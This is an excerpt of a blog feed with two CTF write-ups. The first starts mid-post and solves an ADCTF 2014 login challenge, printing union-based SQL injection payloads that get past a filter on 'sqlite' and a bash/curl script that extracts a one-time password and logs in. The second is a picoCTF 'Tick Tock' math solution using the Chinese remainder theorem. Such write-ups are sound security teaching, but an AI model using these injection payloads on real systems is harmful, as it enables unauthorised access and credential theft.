<p>To log in the web application we need to submit a password, paired with the token we are provided as an hidden field in the form, and this pair of credentials is valid for 10 seconds: if the token has expired we won’t be able to log in, so what we need to do is to find a way to generate a token and exfiltrate the password generated by the application for that specific token, before it expires.</p>

<p>As it’s possible to observe from the source code, the query at line 31 is dynamic, so it’s possible to perform a SQL injection attack against the application.</p>

<p>By sending a tampered token value in the POST request, it’s possible to notice that we are facing a union based injection attack: infact if we send something like this:</p>

<pre><code>token=' UNION SELECT 1;
</code></pre>

<p>we would be presented with the following output in the web page</p>

<p><code>html
	&lt;p&gt;otp expired at 1&lt;/p&gt;
</code></p>

<p>It would at this point be easy to enumerate the database structure, tables and columns to exfiltrate some valid data, but it would have been too easy; at line 25 we can see</p>

<p><code>perl
	    if ($token =~ /sqlite/i) {
        $c-&gt;render('error', message =&gt; "no hack.");
        return;
    }
</code></p>

<p>which makes this challenge a real pain. Infact, as the comment suggets, this is a really tiny yet powerful firewall, because to enumerate the database, we’d need to access the sqlite_master table, where metadata about table structure are stored, but guess what? this is filtered and we cant.</p>

<p>So, no table enumeration: we need to find an alternative way to exfiltrate a valid password to log in.</p>

<p>I’m not that good at sql injection attacks, and in fact it took me a while to figure this out, but after a lot of trial and error i learned that column names are not needed to read data from them</p>

<p>I’ve tried the following injection query and eventually it resulted in the last generated password correctly exfiltrated.</p>

<pre><code>token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);
</code></pre>

<p><code>html
	&lt;p&gt;otp expired at 1bffa01d220d8d69f102dc08b07ba199&lt;/p&gt;
</code></p>

<p>now all i needed was to be fast enaugh to exfiltrate a valid password and login within 10 seconds.</p>

<p>bash and curl came to the rescue, i put togeder this dirty and terrible script that helped me to login and get the flag</p>

<p>&#8220;`bash
	#!/bin/bash</p>

<pre><code>TOKEN=$(curl http://otp.adctf2014.katsudon.org | grep input | grep token | awk -F '"' '{print $6}')
PASS=$(curl http://otp.adctf2014.katsudon.org -d "token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);&amp;pass=" | grep expired | awk -F ' ' '{print $4}' | awk -F '&lt;' '{print $1}')

echo $TOKEN
echo $PASS

curl http://otp.adctf2014.katsudon.org -d "token=$TOKEN&amp;pass=$PASS" ```
</code></pre>

<p>&#8220;`html</p>
<p>authentication succeeded.<br />the flag is: ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5</p>
<p>&#8220;`</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Tick Tock]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock/"/>
    <updated>2014-11-08T21:49:30+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock</id>
    <content type="html"><![CDATA[<p>Math, math, and more math! :)</p>

<p>There was a loth of math in this picoCTF, and Tick Tock was a pretty cool one.</p>

<p>The problem was under the reverse engineering category, but it was definitely mor math related then reverse engineering, as all you had to understand in terms of verersing, was what the python script was doing.</p>

<!-- more -->

<p>If we remove all the visualization stuff, for spinning the clock all the problem revolves around these functions</p>

<p><code>python
	def count(n,m,msg=""):
	  # n % m
	  spin_for = min((m*10),n)
	  nspots = 112
	  for i in xrange(0,spin_for,m/nspots+1):
		speed = 1.0/((spin_for-i)/(m/nspots+1)+1)
		printc(clock(1+i+n-spin_for,m),msg)
		time.sleep(speed)
	  if m/nspots+1 &gt; 2:
		for j in xrange(i,spin_for,max((spin_for-i)/50,1)):
		  printc(clock(1+j+n-spin_for,m),msg)
	  printc(clock(n,m),msg)
	  return n%m
</code></p>

<p>the count() function: that is nothing but a modulus operation with some ascii art :)</p>

<p><code>python
	def powmod(n,p,m,msg=""):
	  # n^p % m
	  for i in xrange(max(0,p-100),p+1):
		speed = 1.0/math.sqrt(1+p-i)
		printc(clock(pow(n,i,m),m),msg)
		time.sleep(speed)
	  return pow(n,p,m)
</code></p>

<p>and the powmod() function: which is nothing but a pow, again with some graphics for displaying the clock.</p>

<p>then the application does the following:</p>

<p>it takes the first argument number we supply, it takes the list named secretz, containing 17 tuples</p>

<p><code>python
	secretz = [(1, 2), (2, 3), (8, 13), (4, 29), (130, 191), (343, 397), (652, 691), (858, 1009),
           (689, 2039), (1184, 4099), (2027, 7001), (5119, 10009), (15165, 19997), (15340, 30013),
           (29303, 70009), (42873, 160009), (158045, 200009)]
</code></p>

<p>and cycles over each tuple using the count() function, which as said earlier is nothing but a modulus operation.</p>

<p><code>python
	for (r,m) in secretz:
	  if count(num,m,"%d %% %d"%(num,m)) != r:
		print
		print "%d %% %d != %d... WRONG"%(num,m,r)
		sys.exit(0)
	  else:
		print
		print "%d %% %d == %d... GOOD"%(num,m,r)
		time.sleep(2)
		print '\033[2A'
		print " "*90
</code></p>

<p>it performs the modulus operation between the number we supplied and the second value of the tuple, and checks that the result of the operation matches the first value, if the result is correct it procedes to the next tuple, if it fails, it exits.</p>

<p>for example, if we assume that x is the first argument we submitted it checks that the following statement is true</p>

<script type="math/tex; mode=display">
\begin{align}
x \equiv 1 \pmod{2}
\end{align}
</script>

<p>and if it is, it performs the check for the next tuple.</p>

<p>So the first part of the problem was to find a value x that would satisfy the equivalence for every tuple in the secretz list.</p>

<p>This problem can be solved using the <em>chinese residiant theorem</em>
which can be implemented in python as follows:</p>

<p>&#8220;`python
	#!/usr/bin/python</p>

<pre><code>def mul_inv(a, b):
	b0 = b
	x0, x1 = 0, 1
	if b == 1: return 1
	while a &gt; 1:
		q = a / b
		a, b = b, a%b
		x0, x1 = x1 - q * x0, x0
	if x1 &lt; 0: x1 += b0
	return x1
 
def chinese_remainder(n, a, lena):
	p = i = prod = 1; sm = 0
	for i in range(lena): prod *= n[i]
	for i in range(lena):
		p = prod / n[i]
		sm += a[i] * mul_inv(p, n[i]) * p
	return sm % prod
 
if __name__ == '__main__':
	n = [2, 3, 13, 29, 191, 397, 691, 1009, 2039, 4099, 7001, 10009, 19997, 30013, 70009, 160009, 200009]
	a = [1, 2, 8, 4, 130, 343, 652, 858, 689, 1184, 2027, 5119, 15165, 15340, 29303, 42873, 158045]
	c = chinese_remainder(n, a, len(n))
	print c ```
</code></pre>

<p>Once we find the number that satisfies the first part of the problem, the second function comes in play</p>

<p><code>python
	if powmod(num,num2,200009*160009,"%d ^ %d %% %d"%(num,num2,200009*160009)) != 1:
	  print
	  print "%d ^ %d %% %d != 1... WRONG"%(num,num2,200009*160009)
	  sys.exit(0)
	else:
	  print "Congratulations! The flag is: %s_%s"%(sys.argv[1],str(num2))
</code></p>

<p>and what happens here is that the last two modulus operand of the secretz list, are multiplied one another and used as a modulus to compute the following equation</p>

<script type="math/tex; mode=display">
\begin{align}
x^y \equiv 1 \pmod{N}
\end{align}
</script>

<p>where </p>

<ul>
  <li>x is our first argument</li>
  <li>y is our second argument</li>
  <li>and N is the number obtained by the multiplication said above</li>
</ul>

<p>Solving this second part is easy, because there is the <em>Euler’s theorem</em> stating</p>

<script type="math/tex; mode=display">
\begin{align}
a^{\phi(N)} \equiv 1 \pmod{N}
\end{align}
</script>

<p>so.. Walfram Alfa to the rescue!</p>

<p>let’s calculate <script type="math/tex">\phi(N)</script> as this will give us the correct value to submit to the program as second parameter.</p>

<p>Unfortunately the clock script was buggy, and during the last step returned an exception, but in the end the calculated numbers were correct, and scored the flag successfully on the web site.</p>

<pre><code>83359654581036155008716649031639683153293510843035531_32002880064
</code></pre>
]]></content>
  </entry>
  
</feed>
